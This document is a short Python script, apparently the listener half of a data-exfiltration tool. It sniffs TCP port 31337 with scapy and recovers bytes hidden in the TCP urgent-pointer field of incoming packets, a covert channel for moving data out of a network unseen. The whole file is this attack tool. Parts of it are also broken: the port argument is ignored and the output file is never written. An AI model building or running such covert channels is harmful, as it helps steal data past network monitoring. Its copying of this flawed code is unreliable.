import sys
from scapy.all import sniff


class UrgentExfilServer:
    def version():
        return '0.0.1'

    def __init__(self, opts):
        filemode = 'ab' if opts.append else 'wb'
        self.outfile = open(opts.outfile, filemode)
        self.port = opts.port
        self.verbose = opts.verbose

    def process(self, packet):
        print(self.bytes_for(packet.urgptr))

    def listen(self):
        fil = "tcp port 31337"  # + str(self.port)
        sniff(filter=fil, prn=self.process)

    def bytes_for(self, integer):
        length = 1 if integer < 2**8 else 2
        return integer.to_bytes(length, 'big')


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(
               description="Exfiltrate data using TCP urg pointer",
               add_help=True
             )
    parser.add_argument('-p', '--port', required=True, action='store',
                        help='Destination port', type=int)
    parser.add_argument('-f', '--outfile', action='store',
                        help='Location to save received data',
                        default="woofer")
    parser.add_argument('-v', '--verbose', action='store_true',
                        dest='verbose', help='Enable verbose output')
    parser.add_argument('--truncate', action='store_false', dest='append',
                        help='Truncate outfile', default=True)
    parser.add_argument('--version', action='version',
                        version=('%(prog)s ' + UrgentExfilServer.version()),
                        help="Show version information")
    opts = parser.parse_args()
    exfil = UrgentExfilServer(opts)
    exfil.listen()
    sys.exit(0)
